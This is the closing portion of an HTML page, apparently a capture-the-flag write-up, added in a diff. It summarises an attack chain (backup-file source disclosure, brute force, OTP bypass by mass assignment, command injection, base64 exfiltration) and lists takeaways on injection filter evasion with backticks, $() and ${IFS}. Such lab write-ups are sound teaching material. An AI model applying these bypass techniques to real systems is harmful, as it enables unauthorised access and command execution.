+    <div class="callout green"><strong>Chain complete.</strong> .bak source disclosure → credential format leak → 40-attempt brute → OTP mass-assignment bypass → web flag → backtick CMDi → base64 exfil → system flag.</div>
+  </section>
+
+  <!-- 08 TAKEAWAYS -->
+  <section class="section" id="takeaways">
+    <div class="s-num">08</div>
+    <h2>Key Takeaways</h2>
+    <div class="steps">
+      <div class="step"><div class="sn">01</div><div class="sb"><strong>A 200 OK with the fallback body size is a 404.</strong> PHP apps that rewrite missing files to <code>index.php</code> return 200 for everything. Compare sizes — any response that differs from the baseline is a real file.</div></div>
+      <div class="step"><div class="sn">02</div><div class="sb"><strong>Always sweep for backup extensions.</strong> <code>.bak</code>, <code>.old</code>, <code>.swp</code>, <code>~</code>, <code>.orig</code>, <code>.save</code> against every known PHP file. Text editors and sloppy deployments leave these behind. They're not parsed by PHP — served as raw text.</div></div>
+      <div class="step"><div class="sn">03</div><div class="sb"><strong>Response tampering fools the client, not the server.</strong> If the server's session state isn't set, no amount of JSON manipulation changes what <code>dashboard.php</code> will return. Always tamper the request, not the response.</div></div>
+      <div class="step"><div class="sn">04</div><div class="sb"><strong>The leaked field name is the payload.</strong> When a server includes an internal boolean (<code>is_verified</code>) in a JSON response that the client never reads, that field is almost always read from the request body too. Send it back set to <code>true</code>.</div></div>
+      <div class="step"><div class="sn">05</div><div class="sb"><strong>Client-side filters are theatre.</strong> A <code>replace(/[;&|]/g,'')</code> in JavaScript is skipped by every HTTP client that isn't a browser. The filter must live server-side. And even then — backticks, <code>$()</code>, <code>${IFS}</code>, and newlines weren't on this list.</div></div>
+      <div class="step"><div class="sn">06</div><div class="sb"><strong>Bash brace expansion eats <code>THM{...}</code> flags in subshells.</strong> Curly braces are shell metacharacters. Encode before the output touches the shell: <code>base64 &lt;file&gt;</code>, <code>xxd</code>, or <code>od -An -c</code>. Decode locally after exfil.</div></div>
+    </div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#killchain">00 — Kill Chain</a></li>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#bak">02 — .bak Disclosure</a></li>
+    <li><a href="#deadends">03 — Dead Ends</a></li>
+    <li><a href="#brute">04 — Brute Force</a></li>
+    <li><a href="#otp">05 — OTP Bypass</a></li>
+    <li><a href="#rce">06 — Command Injection</a></li>
+    <li><a href="#chain">07 — Full Chain</a></li>
+    <li><a href="#takeaways">08 — Takeaways</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-copy">© 2025 CyberMaks</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
